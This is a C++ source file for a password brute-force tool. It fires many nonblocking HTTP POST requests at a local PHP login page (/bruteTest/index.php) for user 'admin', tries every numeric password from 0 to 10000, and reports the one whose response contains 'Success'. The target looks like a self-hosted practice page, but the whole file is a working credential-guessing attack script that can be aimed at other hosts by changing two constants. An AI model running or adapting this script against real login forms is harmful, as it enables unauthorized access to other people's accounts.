#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <errno.h>
#include <map>

#define IP		"127.0.0.1"
#define PORT	80

#define MAX_HTTP_SIZE	3000
#define MIN_PASSWORD	0
#define MAX_PASSWORD	10000

#define EPOLL_SIZE		100

using namespace std;

void setnonblockingmode(int fd);

int main(int argc, char *argv[])
{
	int sock;
	struct sockaddr_in serv_addr;
	char http_cmn[MAX_HTTP_SIZE];
	char http_send[MAX_HTTP_SIZE];
	char http_recv[MAX_HTTP_SIZE];
	int recv_sz;
	int pw;

	struct epoll_event *ep_events;
	struct epoll_event event;
	int epfd, event_cnt;
	int fd_cnt = 0;
	int i;

	map<int,int> m;
	bool request_finish = false;

	setnonblockingmode(1);
	setnonblockingmode(2);

	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(IP);
	serv_addr.sin_port = htons(PORT);
	
	strcpy(http_cmn,"POST /bruteTest/index.php HTTP/1.1 \r\n");
	strcat(http_cmn,"Host: 127.0.0.1 \r\n");
	strcat(http_cmn,"Content-Type: application/x-www-form-urlencoded \r\n");
	strcat(http_cmn,"Content-Length: 100 \r\n");
	strcat(http_cmn,"\r\n");
	strcat(http_cmn,"id=admin&pw=");

	epfd = epoll_create(EPOLL_SIZE);
	ep_events = (struct epoll_event*) malloc(sizeof(struct epoll_event)*EPOLL_SIZE);
	
	pw=MIN_PASSWORD;
	while(!request_finish || fd_cnt>0)
	{
		event_cnt = epoll_wait(epfd, ep_events, EPOLL_SIZE, 0);
		for(i=0; i<event_cnt; ++i) {
			sock = ep_events[i].data.fd;
			while((recv_sz=recv(sock, http_recv, MAX_HTTP_SIZE-1, 0)) != 0) {
				if(recv_sz < 0) {
					if(errno == EAGAIN)
						break;
					else {
						fprintf(stderr,"recv return -1!!\n");
						continue;
					}
				}
				http_recv[recv_sz] = '\0';
				if(strstr(http_recv,"Success")) {
					printf("[*] Found!\n[*] Password is %d\n", m[sock]);
					epoll_ctl(epfd, EPOLL_CTL_DEL, sock, NULL);
					--fd_cnt;
					close(sock);
					exit(1);
				}
			}
			printf("[*] Trying %d... finished!\n", m[sock]);
			epoll_ctl(epfd, EPOLL_CTL_DEL, sock, NULL);
			--fd_cnt;
			close(sock);
		}

		if(request_finish)
			continue;

		printf("[*] Trying %d...\n",pw);
		
		while((sock=socket(PF_INET, SOCK_STREAM, 0)) == -1) {
			fprintf(stderr, "socket() error!!\n");
		}

		while(connect(sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) == -1) {
			fprintf(stderr, "connect() error!!\n");
		}

		setnonblockingmode(sock);
		
		m[sock] = pw;

		sprintf(http_send, "%s%d", http_cmn, pw);
		send(sock, http_send, strlen(http_send), 0);
		shutdown(sock, SHUT_WR);

		event.events = EPOLLIN | EPOLLET;
		event.data.fd = sock;
		if(epoll_ctl(epfd, EPOLL_CTL_ADD, sock, &event) != 0) {
			fprintf(stderr, "epoll_ctl() error!!\n");
			close(sock);
			--pw;
		}
		++fd_cnt;
		
		if(++pw > MAX_PASSWORD) {
			request_finish = true;
		}
	}

	printf("[*] Brute Fail!\n");

	close(epfd);
	free(ep_events);

	return 0;
}

void setnonblockingmode(int fd)
{
	int flag = fcntl(fd, F_GETFL, 0);
	fcntl(fd, F_SETFL, flag | O_NONBLOCK);
}
